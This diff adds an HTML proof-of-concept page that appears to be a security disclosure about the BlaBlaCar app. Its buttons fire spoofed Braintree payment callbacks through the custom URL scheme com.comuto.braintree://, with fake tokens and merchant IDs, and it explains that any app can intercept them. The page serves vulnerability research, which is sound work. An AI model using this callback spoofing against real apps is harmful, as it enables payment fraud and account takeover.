@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BlaBlaCar Payment Hijack Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        h2 {
+            text-align: center;
+            color: #d32f2f;
+            margin-bottom: 20px;
+        }
+        
+        .button-row {
+            margin-bottom: 15px;
+        }
+        
+        .test-button {
+            display: block;
+            width: 100%;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .success {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .error {
+            background: #f44336;
+            color: white;
+        }
+        
+        .cancel {
+            background: #FF9800;
+            color: white;
+        }
+        
+        .test-button:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        .info {
+            background: #2196F3;
+            color: white;
+        }
+        
+        .description {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🚨 Payment Hijack Test</h2>
+        
+        <p class="description">Click buttons to simulate BlaBlaCar payment callbacks intercepted by malicious app</p>
+
+        <!-- Row 1: Success -->
+        <div class="button-row">
+            <button class="test-button success" onclick="testSuccess()">
+                ✅ Payment Success<br>
+                <small>Simulate successful payment</small>
+            </button>
+        </div>
+
+        <!-- Row 2: Error -->
+        <div class="button-row">
+            <button class="test-button error" onclick="testError()">
+                ❌ Payment Error<br>
+                <small>Simulate payment failure</small>
+            </button>
+        </div>
+
+        <!-- Row 3: Cancel & Info -->
+        <div class="button-row">
+            <button class="test-button cancel" onclick="testCancel()">
+                ⚠️ Payment Cancel<br>
+                <small>Simulate user cancellation</small>
+            </button>
+        </div>
+        
+        <!-- Additional Info Row -->
+        <div class="button-row">
+            <button class="test-button info" onclick="showInfo()">
+                ℹ️ Vulnerability Info<br>
+                <small>About this security issue</small>
+            </button>
+        </div>
+
+    </div>
+
+    <script>
+    function testSuccess() {
+        window.location.href = "com.comuto.braintree://payment/success?token=PAY-5XY12345AB67890CD&intent=sale&amount=25.50&currency=EUR&correlation_id=corr_123456&merchant_account_id=blablacar_eur";
+    }
+    
+    function testError() {
+        window.location.href = "com.comuto.braintree://payment/error?error_code=INSUFFICIENT_FUNDS&error_message=Payment%20declined&correlation_id=corr_123456&merchant_account_id=blablacar_eur";
+    }
+    
+    function testCancel() {
+        window.location.href = "com.comuto.braintree://payment/cancel?correlation_id=corr_123456&merchant_account_id=blablacar_eur";
+    }
+    
+    function showInfo() {
+        alert("VULNERABILITY: Any app can register 'com.comuto.braintree' scheme and intercept BlaBlaCar payment callbacks, including:\n\n• Payment tokens\n• Transaction amounts\n• Success/failure status\n• Merchant account data\n\nThis allows payment fraud and account takeover.");
+    }
+    </script>
+</body>
+</html>
